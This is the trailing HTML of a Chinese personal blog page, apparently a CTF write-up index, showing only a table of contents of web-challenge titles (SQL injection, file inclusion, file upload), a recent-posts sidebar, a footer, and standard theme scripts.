class="toc-text">这是一个神奇的登陆框</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E6%AC%A1"><span class="toc-number">1.17.</span> <span class="toc-text">多次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-encrypt-1-ISCCCTF"><span class="toc-number">1.18.</span> <span class="toc-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2"><span class="toc-number">1.19.</span> <span class="toc-text">文件包含2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-php"><span class="toc-number">1.20.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A52"><span class="toc-number">1.21.</span> <span class="toc-text">sql注入2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%9E%84%E9%80%A0%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.21.1.</span> <span class="toc-text">尝试构造注入语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%99xx%E7%9A%84%E5%8D%9A%E5%AE%A2"><span class="toc-number">1.22.</span> <span class="toc-text">孙xx的博客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC"><span class="toc-number">1.23.</span> <span class="toc-text">Trim的日记本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login2-SKCTF-login3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02-login4"><span class="toc-number">1.24.</span> <span class="toc-text">login2(SKCTF)  login3  文件上传2  login4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%9F%E6%B9%96%E9%AD%94%E5%A4%B4"><span class="toc-number">1.25.</span> <span class="toc-text">江湖魔头</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/08/flask/" title="flask"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="flask"/></a><div class="content"><a class="title" href="/2021/02/08/flask/" title="flask">flask</a><time datetime="2021-02-08T07:13:40.000Z" title="发表于 2021-02-08 15:13:40">2021-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/03/winter-homework/" title="winter_homework"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="winter_homework"/></a><div class="content"><a class="title" href="/2021/02/03/winter-homework/" title="winter_homework">winter_homework</a><time datetime="2021-02-03T13:49:09.000Z" title="发表于 2021-02-03 21:49:09">2021-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/sql-labs/" title="sql_labs"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql_labs"/></a><div class="content"><a class="title" href="/2021/01/30/sql-labs/" title="sql_labs">sql_labs</a><time datetime="2021-01-30T13:13:02.000Z" title="发表于 2021-01-30 21:13:02">2021-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/11/cumtfinal/" title="cumtfinal"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cumtfinal"/></a><div class="content"><a class="title" href="/2021/01/11/cumtfinal/" title="cumtfinal">cumtfinal</a><time datetime="2021-01-11T14:04:30.000Z" title="发表于 2021-01-11 22:04:30">2021-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="密码学"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="密码学"/></a><div class="content"><a class="title" href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="密码学">密码学</a><time datetime="2020-12-23T08:37:43.000Z" title="发表于 2020-12-23 16:37:43">2020-12-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By sunzy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>